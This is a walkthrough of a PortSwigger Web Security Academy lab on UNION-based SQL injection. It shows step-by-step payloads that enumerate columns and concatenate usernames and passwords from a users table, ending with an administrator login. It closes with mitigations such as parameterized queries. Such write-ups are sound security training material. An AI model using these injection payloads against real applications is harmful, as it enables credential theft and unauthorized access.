# SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

## Lab Information

| Category | SQL Injection |
|---|---|
| Lab Name | SQL injection UNION attack, retrieving multiple values in a single column |
| Difficulty | Practitioner |
| Platform | PortSwigger Web Security Academy |

---

# Description

This lab demonstrates a UNION-based SQL Injection vulnerability where multiple database values were extracted through a single column using SQL concatenation.

The application filtered products using the following endpoint:

```text
/filter?category=accessories
```

The attacker first determined the number of columns returned by the original query using the `ORDER BY` technique.

After confirming that the query returned **2 columns**, multiple UNION-based payloads were tested to identify which column accepted string data.

The final step involved concatenating usernames and passwords into a single column using SQL concatenation operators.

This allowed extraction of administrator credentials from the backend database.

---

# Vulnerability Type

- SQL Injection (SQLi)
- UNION-Based SQL Injection
- Data Extraction
- Database Enumeration

---

# Impact

An attacker can manipulate database queries to extract sensitive information from backend tables.

This may lead to:
- credential disclosure
- unauthorized administrator access
- sensitive data exposure
- privilege escalation
- complete database compromise

SQL Injection vulnerabilities capable of retrieving credentials are considered critical.

---

# Steps to Reproduce

1. Open the target application.
2. Navigate to the **Accessories** category.
3. Capture the following request using Burp Suite:

```text
/filter?category=accessories
```

4. Use the `ORDER BY` technique to determine the number of columns.
5. Confirm that the backend query contains **2 columns**.
6. Validate the UNION query structure using:

```sql
/filter?category=' UNION SELECT null,null FROM users--
```

7. Test which column accepts string data.
8. Inject:

```sql
/filter?category=' UNION SELECT username,null FROM users--
```

9. Observe that the application returns:

```http
500 Internal Server Error
```

10. Test the second column:

```sql
/filter?category=' UNION SELECT password,null FROM users--
```

11. Observe that the response still returns an error.
12. Test with numeric and string values:

```sql
/filter?category=' UNION SELECT 1,username FROM users--
```

13. Observe that usernames become visible in the application's response.
14. Use SQL concatenation to combine usernames and passwords:

```sql
/filter?category=' UNION SELECT 1,username||':'||password FROM users--
```

15. Observe that usernames and passwords are displayed together.
16. Copy the administrator credentials.
17. Navigate to the login page.
18. Authenticate using the extracted administrator credentials.
19. The lab gets successfully solved.

---

# Proof of Concept (PoC)

## Step 1 — Accessing the Main Website

The application initially appears to be a normal e-commerce website with product filtering functionality.

![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6.png?raw=true)

**Caption:** Initial application interface containing the Accessories category filter.

---

## Step 2 — Capturing the Product Filter Request

The request generated after selecting the **Accessories** category was intercepted using Burp Suite.

```text
/filter?category=accessories
```

![Captured Request](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6(1).png?raw=true)

**Caption:** Captured request using the category filter parameter.

---

## Step 3 — Determining the Number of Columns

The `ORDER BY` technique was used to determine the number of columns returned by the backend query.

In this case, the application contained **2 columns**.

The following validation query was used:

```sql
/filter?category=' UNION SELECT null,null FROM users--
```

![Column Enumeration](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6(2).png?raw=true)

**Caption:** Determining and validating the number of backend query columns.

---

## Step 4 — Testing the First Column

The following payload was used:

```sql
/filter?category=' UNION SELECT username,null FROM users--
```

The application responded with:

```http
500 Internal Server Error
```

indicating that the first column did not properly support string data.

![First Column Error](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6(3).png?raw=true)

**Caption:** Attempting to inject string data into the first column.

---

## Step 5 — Testing the Second Column

Another payload was tested:

```sql
/filter?category=' UNION SELECT password,null FROM users--
```

The application still returned an error response.

![Second Column Error](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6(4).png?raw=true)

**Caption:** Attempting to inject string data into the second column.

---

## Step 6 — Identifying the Displayed String-Compatible Column

The following payload was used:

```sql
/filter?category=' UNION SELECT 1,username FROM users--
```

This successfully displayed usernames in the application's response, confirming that:
- the first column accepted numeric values
- the second column accepted and displayed string data

![Username Extraction](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20UNION%20Attack,%20Retrieving%20Multiple%20Values%20in%20a%20Single%20Column/screenshots/lab6(5).png?raw=true)

**Caption:** Successfully displaying usernames through the second column.

---

## Step 7 — Concatenating Usernames and Passwords

Using SQL concatenation syntax from the PortSwigger SQL Injection cheat sheet, the following payload was created:

```sql
/filter?category=' UNION SELECT 1,username||':'||password FROM users--
```

This combined usernames and passwords into a single displayed column.

The administrator credentials became visible in the application's response.

![Credential Concatenation](screenshots/sqli-multiple-values-7.png)

**Caption:** Extracting usernames and passwords using SQL concatenation.

---

## Step 8 — Logging into the Administrator Account

The extracted administrator credentials were used to authenticate successfully.

The lab was solved successfully.

![Administrator Login](screenshots/sqli-multiple-values-8.png)

**Caption:** Successful administrator login using credentials extracted via SQL Injection.

---

# Why It Works

The application directly inserted user-controlled input into a SQL query without proper sanitization.

The attacker:
- identified the number of columns
- determined which column displayed string data
- used SQL concatenation to combine multiple values into a single displayed column

The payload:

```sql
username||':'||password
```

merged usernames and passwords together, allowing sensitive data to appear inside the application's response.

This made it possible to retrieve administrator credentials directly from the backend database.

---

# Security Risk

This vulnerability can result in:
- credential disclosure
- unauthorized administrator access
- sensitive data exposure
- privilege escalation
- complete database compromise

UNION-based SQL Injection vulnerabilities are extremely dangerous because they allow direct database extraction.

---

# Recommended Mitigation

- Use parameterized queries (prepared statements).
- Never concatenate user input into SQL queries.
- Apply strict input validation.
- Use ORM frameworks when possible.
- Restrict database account permissions using least privilege principles.

---

# Learning Section

## What I Learned

- UNION-based SQL Injection can retrieve sensitive information from backend tables.
- Column data types affect whether injected data appears successfully.
- SQL concatenation allows combining multiple values into a single displayed column.
- The `ORDER BY` technique helps identify query structure.
- Improper SQL query construction can expose critical backend credentials.

---

# Tools Used

- Burp Suite
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy

---

# Conclusion

This lab demonstrated a UNION-based SQL Injection vulnerability that allowed extraction of multiple sensitive values through a single database column.

By identifying the correct column structure and using SQL concatenation techniques, administrator credentials were extracted from the backend database, ultimately allowing unauthorized administrator access.
